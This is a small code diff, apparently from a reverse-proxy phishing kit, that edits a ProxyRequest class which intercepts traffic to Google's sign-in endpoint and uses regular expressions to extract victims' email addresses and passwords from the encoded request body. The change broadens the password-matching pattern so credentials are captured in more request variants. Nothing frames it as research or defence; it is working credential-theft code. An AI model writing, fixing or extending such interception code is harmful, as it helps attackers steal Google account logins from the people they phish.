@@ -39,7 +39,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                 // const bgRegex = /bgRequest=[^&]*/
                 if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')) {
                     const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
-                    const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C1%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
+                    const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
                     
                     const emailMatch = emailRegex.exec(kJust)
                     const passwordMatch = pwRegex.exec(kJust)
